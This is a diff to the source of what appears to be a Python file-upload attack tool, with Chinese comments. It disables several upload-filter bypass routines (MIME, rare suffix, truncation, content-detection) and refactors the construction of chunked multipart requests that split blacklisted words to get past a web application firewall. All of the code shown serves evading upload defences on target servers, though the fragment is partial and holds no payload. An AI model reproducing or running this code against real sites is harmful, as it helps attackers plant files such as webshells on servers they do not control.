@@ -42,10 +42,10 @@ class General:
         :return:
         '''
         self.prepare()   # 设置通用参数
-        self.mimeBypass()   # MIME绕过
-        self.rareSuffixBypass()  # 同义后缀名绕过
-        self.truncatedBypass()  # 截断上传绕过
-        self.confuseBypass()    # 文件内容检测绕过
+        # self.mimeBypass()   # MIME绕过
+        # self.rareSuffixBypass()  # 同义后缀名绕过
+        # self.truncatedBypass()  # 截断上传绕过
+        # self.confuseBypass()    # 文件内容检测绕过
         self.chunkBypass()     # 分块传输绕waf
         self.end(stop=True)
         return
@@ -214,7 +214,8 @@ class General:
         ]
         try:
             print(blue('[ Info ]') + fuchsia('绕过姿势:') + cyan('分块传输'))
-            body = self.gen_body()   # 构造body
+            form = self.gen_form()     # 构造表单
+            body = self.gen_body(form)   # 构造body
             cd = chunk_data(body, blackwords)   # 构造chunk数据包
             raw = self.genChunkRaw(self.args.u, cd)   # 构造完整请求体
         except:
@@ -364,23 +365,8 @@ Transfer-Encoding: Chunked
         )
         return raw
 
-    def gen_body(self):
+    def gen_body(self, form, boundary='------WebKitFormBoundary3xCzmJioizRcn0t4'):
         # 构造请求体
-        boundary = '------WebKitFormBoundary3xCzmJioizRcn0t4'
-        form = ''
-        if self.data != {}:
-            for x in self.data:
-                form += \
-                """
-{boundary}
-Content-Disposition: form-data; name="{key}"
-
-{value}""".format(
-                    boundary=boundary,
-                    key=x,
-                    value=self.data[x]
-                )
-
         body = \
             """
 {boundary}
@@ -399,4 +385,21 @@ Content-Type: {ct}
                 form=form
             )
         return body
+
+    def gen_form(self, boundary='------WebKitFormBoundary3xCzmJioizRcn0t4'):
+        # 构造form表单
+        form = ''
+        if self.data != {}:
+            for x in self.data:
+                form += \
+                    """
+{boundary}
+Content-Disposition: form-data; name="{key}"
+
+{value}""".format(
+                boundary=boundary,
+                key=x,
+                value=self.data[x]
+            )
+        return form
 
